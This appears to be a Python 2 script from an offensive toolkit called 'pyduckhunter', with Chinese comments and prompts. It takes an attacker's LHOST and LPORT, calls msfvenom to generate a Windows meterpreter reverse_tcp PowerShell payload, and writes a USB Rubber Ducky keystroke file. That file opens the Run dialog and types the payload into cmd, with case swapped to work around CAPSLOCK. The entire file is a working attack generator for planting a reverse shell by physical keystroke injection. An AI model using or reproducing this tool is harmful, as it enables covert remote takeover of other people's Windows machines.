#!/usr/bin/python env
#-*-coding:utf-8-*-
#####powershell_Excute_Reverse_tcp_payload(meterpreter)#####
####直接powershell执行meterpreter_reverse_tcp，ps：加载代码世间很长#####
import os,sys
sys.dont_write_bytecode = True
from logo import *
def Excute():
        lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LHOST:")
        lport = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LPORT:")
        def msfvenom(lhost, lport):
            c = "msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f psh-cmd"
            return c
        shellout = os.popen(msfvenom(lhost, lport)).read()
        f = open('output/Powershell_Execute_reverse_tcp.txt', 'w')
        f.write("CAPSLOCK\n")
        f.write("DELAY 1000\n")
        f.write("GUI r\n")
        f.write("DELAY 1000\n")
        f.write("STRING cmd\n")
        f.write("DELAY 1000\n")
        f.write("STRING ")
        f.write(shellout.swapcase())
        f.write("\n")
        f.write("CAPSLOCK")
        f.close()
        f = open('output/Powershell_Execute_reverse_tcp.txt', 'r')
        f.readlines()
        print "[\033[1;32;1m+\033[0m] 文件生成在 output/Powershell_Execute_reverse_tcp.txt"